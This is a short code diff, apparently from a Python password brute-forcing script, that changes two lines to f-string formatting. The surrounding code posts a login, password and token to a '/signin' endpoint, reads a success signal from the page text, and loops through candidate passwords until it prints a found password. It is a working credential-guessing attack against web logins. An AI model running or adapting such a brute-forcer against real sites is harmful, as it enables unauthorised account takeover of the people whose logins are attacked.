@@ -21,7 +21,7 @@ def check(url, login, password):
         'field': field,
         '_token': token
     }
-    html = requests.post(url=url+'/signin', data=data, cookies=cookies).text
+    html = requests.post(url=f'{url}/signin', data=data, cookies=cookies).text
     return 'Welcome Back' not in html
     
     
@@ -37,7 +37,7 @@ def main():
     for password in get_passwords():
         print(password)
         if check(url, login, password):
-            print('Found password for %s: %s' % (login, password))
+            print(f'Found password for {login}: {password}')
             return
     
     
